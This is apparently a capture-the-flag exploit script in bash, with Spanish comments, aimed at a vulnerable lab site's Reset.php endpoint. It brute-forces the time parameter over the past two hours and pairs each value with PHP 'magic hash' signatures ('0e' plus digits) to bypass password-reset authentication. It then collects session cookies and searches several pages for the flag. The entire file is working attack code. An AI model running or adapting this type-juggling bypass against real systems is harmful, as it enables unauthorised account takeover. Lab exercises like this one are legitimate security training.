#!/bin/bash

echo "=== Brute Force Time Parameter ==="

BASE_URL="http://hackme13.vulnmachines.com:9999"
USER="admin"
CURRENT_TIME=$(date +%s)

# Obtener longitud de respuesta inválida
INVALID_LEN=$(curl -s "${BASE_URL}/Reset.php?user=${USER}&time=1111111111&sig=invalid" | wc -c)
echo "[*] Longitud respuesta inválida: $INVALID_LEN"

echo "[*] Iniciando fuerza bruta exhaustiva..."

# Probar cada segundo en las últimas 2 horas
for i in $(seq 0 7200); do
    TIME=$((CURRENT_TIME - i))
    
    # Para cada time, probar con sig=0e seguido de diferentes combinaciones de números
    for digits in "000000" "111111" "123456" "999999" "215962" "730083" "807097" "001233" "516903" "462843"; do
        SIG="0e${digits}"
        URL="${BASE_URL}/Reset.php?user=${USER}&time=${TIME}&sig=${SIG}"
        
        # Obtener respuesta
        RESPONSE=$(curl -s -w "\n%{http_code}" "$URL")
        STATUS=$(echo "$RESPONSE" | tail -1)
        CONTENT=$(echo "$RESPONSE" | head -n -1)
        LEN=$(echo -n "$CONTENT" | wc -c)
        
        # Si el código es 302 o la longitud es diferente
        if [ "$STATUS" = "302" ] || [ "$LEN" -ne "$INVALID_LEN" ]; then
            echo -e "\n[+] Respuesta diferente!"
            echo "[+] Time: $TIME"
            echo "[+] Sig: $SIG"
            echo "[+] Status: $STATUS"
            echo "[+] Longitud: $LEN"
            
            # Verificar redirección
            LOCATION=$(curl -s -I "$URL" | grep -i "location:" | cut -d' ' -f2 | tr -d '\r')
            if [ ! -z "$LOCATION" ]; then
                echo "[+] Location: $LOCATION"
                
                # Si redirige a NewPass.php, hemos tenido éxito
                if [[ "$LOCATION" == *"NewPass.php"* ]]; then
                    echo "[+] ¡ÉXITO! Autenticación bypass exitosa"
                    echo "[+] URL completa: $URL"
                    
                    # Intentar obtener la flag
                    COOKIE_JAR="/tmp/cookies.txt"
                    curl -s -c "$COOKIE_JAR" -L "$URL" > /tmp/response.html
                    
                    # Buscar flag
                    if grep -o "vnm{[^}]*}" /tmp/response.html 2>/dev/null; then
                        echo "[+] ¡FLAG ENCONTRADA!"
                        exit 0
                    fi
                    
                    # Si no está en la primera respuesta, probar otras páginas
                    for page in "NewPass.php" "home.php" "flag.php" "admin.php"; do
                        RESP=$(curl -s -b "$COOKIE_JAR" "${BASE_URL}/${page}")
                        if echo "$RESP" | grep -o "vnm{[^}]*}" 2>/dev/null; then
                            echo "[+] Flag encontrada en $page"
                            exit 0
                        fi
                    done
                    
                    echo "[*] Autenticación exitosa pero flag no encontrada automáticamente"
                    echo "[*] Prueba acceder manualmente a: $URL"
                    exit 0
                fi
            fi
        fi
    done
    
    # Mostrar progreso cada 100 iteraciones
    if [ $((i % 100)) -eq 0 ] && [ $i -gt 0 ]; then
        echo -n "."
    fi
done

echo -e "\n[-] No se encontró un bypass válido"